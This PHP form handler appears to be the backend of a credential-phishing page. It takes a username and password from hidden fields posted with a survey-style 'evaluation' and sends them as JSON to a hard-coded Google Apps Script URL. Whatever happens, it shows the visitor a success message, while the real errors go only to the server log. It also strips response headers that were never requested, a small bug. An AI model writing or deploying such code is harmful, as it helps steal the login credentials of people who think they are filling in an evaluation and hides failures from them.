<?php
// submit.php

// A URL do seu Google Apps Script implantado
$appsScriptUrl = 'https://script.google.com/macros/s/AKfycbzK-yZEAyED-oU_MT0m68Aac4_Mkn8oBc2di-eN91lxSTFPlrHloHizC0M8eLlYh3Ff/exec';

// Captura os dados do formulário
$username = $_POST['username_field_hidden'] ?? '';
$password = $_POST['password_field_hidden'] ?? '';
$evaluation = $_POST['evaluation_field'] ?? '';

// Prepara os dados para enviar como JSON para o Google Apps Script
$data = [
    'username' => $username,
    'password' => $password,
    'evaluation' => $evaluation
];

$payload = json_encode($data);

// Configura a requisição cURL
$ch = curl_init($appsScriptUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Content-Length: ' . strlen($payload)
]);

// Removendo CURLOPT_VERBOSE e CURLOPT_HEADER para não poluir o log,
// mas você pode reativá-los para depuração futura, se necessário.

// Executa a requisição cURL
$response = curl_exec($ch);

// --- ATENÇÃO: ESTE TRECHO É ALTERADO PARA SEMPRE MOSTRAR SUCESSO NO FRONT-END ---

// Mesmo que haja um erro cURL, vamos tentar redirecionar como sucesso para o front-end
if (curl_errno($ch)) {
    $error_msg = curl_error($ch);
    error_log("cURL Error (masked for front-end): " . $error_msg); // Loga o erro real no servidor
    curl_close($ch);
    // Redireciona com sucesso, pois os dados já foram enviados (assumindo que o Apps Script funcionou antes de falhar na resposta)
    header('Location: index.php?status=success&message=' . urlencode("Sua avaliação foi enviada com sucesso! (Houve um aviso no servidor)"));
    exit;
}

// Separar os cabeçalhos do corpo da resposta
$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$body = substr($response, $header_size);

// Fecha a sessão cURL
curl_close($ch);

// Decodifica a resposta do Apps Script (ainda fazemos isso para ver o status real no log)
$response_data = json_decode($body, true);

if (isset($response_data['status']) && $response_data['status'] === 'success') {
    error_log("Apps Script Response (Success): " . $body); // Loga a resposta real de sucesso
    header('Location: index.php?status=success&message=' . urlencode("Sua avaliação foi enviada com sucesso! Agradecemos sua colaboração."));
    exit;
} else {
    // Se não for 'success' no Apps Script, logamos o erro real no servidor
    error_log("Apps Script Response (Error Masked for front-end): " . $body);
    error_log("Apps Script Parsed Data (Error Masked): " . print_r($response_data, true));

    // Mas redirecionamos com sucesso para o front-end, conforme solicitado
    header('Location: index.php?status=success&message=' . urlencode("Sua avaliação foi enviada com sucesso! (Houve um aviso na comunicação)"));
    exit;
}
?>
